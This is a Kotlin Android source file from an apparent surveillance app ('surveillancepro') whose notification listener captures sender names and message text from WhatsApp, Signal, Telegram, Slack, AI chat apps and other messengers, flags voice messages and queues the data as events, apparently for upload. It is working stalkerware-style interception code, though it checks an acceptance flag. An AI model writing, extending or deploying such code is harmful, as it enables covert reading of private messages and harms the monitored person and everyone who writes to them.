package com.surveillancepro.android.services

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SupervisionNotificationListener : NotificationListenerService() {

    private var lastNotifKey = ""
    private var lastNotifTime = 0L

    private val monitoredApps = mapOf(
        "com.whatsapp" to "WhatsApp",
        "com.whatsapp.w4b" to "WhatsApp Business",
        "org.telegram.messenger" to "Telegram",
        "com.facebook.orca" to "Messenger",
        "com.instagram.android" to "Instagram",
        "com.snapchat.android" to "Snapchat",
        "org.thoughtcrime.securesms" to "Signal",
        "com.google.android.apps.messaging" to "Messages",
        "com.samsung.android.messaging" to "Samsung Messages",
        "com.android.mms" to "SMS",
        "com.slack" to "Slack",
        "com.microsoft.teams" to "Teams",
        "com.discord" to "Discord",
        "com.skype.raider" to "Skype",
        "com.viber.voip" to "Viber",
        // Chatbots IA
        "com.openai.chatgpt" to "ChatGPT",
        "com.google.android.apps.bard" to "Gemini",
        "com.anthropic.claude" to "Claude",
        // Autres
        "com.tencent.mm" to "WeChat",
        "jp.naver.line.android" to "Line",
        "com.imo.android.imoim" to "Imo",
    )

    private val voiceMessagePatterns = listOf(
        "message vocal", "voice message", "audio", "ptt",
        "\uD83C\uDFA4", // microphone emoji
        "message audio", "nota de voz", "sprachnachricht",
    )

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        val packageName = sbn.packageName
        val appName = monitoredApps[packageName] ?: return

        val extras = sbn.notification.extras
        val title = extras.getCharSequence("android.title")?.toString() ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val bigText = extras.getCharSequence("android.bigText")?.toString()
        val subText = extras.getCharSequence("android.subText")?.toString()
        val infoText = extras.getCharSequence("android.infoText")?.toString()

        val messageContent = bigText ?: text
        if (messageContent.isBlank()) return

        // Déduplication par clé unique (app + sender + message content)
        val notifKey = "$packageName|$title|${messageContent.take(100)}"
        val now = System.currentTimeMillis()
        if (notifKey == lastNotifKey && now - lastNotifTime < 2000) return
        lastNotifKey = notifKey
        lastNotifTime = now

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())

        val isVoiceMessage = voiceMessagePatterns.any {
            messageContent.lowercase().contains(it) || text.lowercase().contains(it)
        }

        val payload = mutableMapOf<String, Any>(
            "app" to appName,
            "packageName" to packageName,
            "sender" to title,
            "message" to messageContent,
            "timestamp" to timestamp,
        )
        subText?.let { payload["group"] = it }
        infoText?.let { payload["info"] = it }
        if (isVoiceMessage) payload["isVoiceMessage"] = true

        // Extraire le nombre de messages non lus si disponible
        val number = sbn.notification.number
        if (number > 0) payload["unreadCount"] = number

        val queue = EventQueue.getInstance(applicationContext)
        val eventType = if (isVoiceMessage) "voice_message" else "notification_message"
        queue.enqueue(eventType, payload)
    }
}
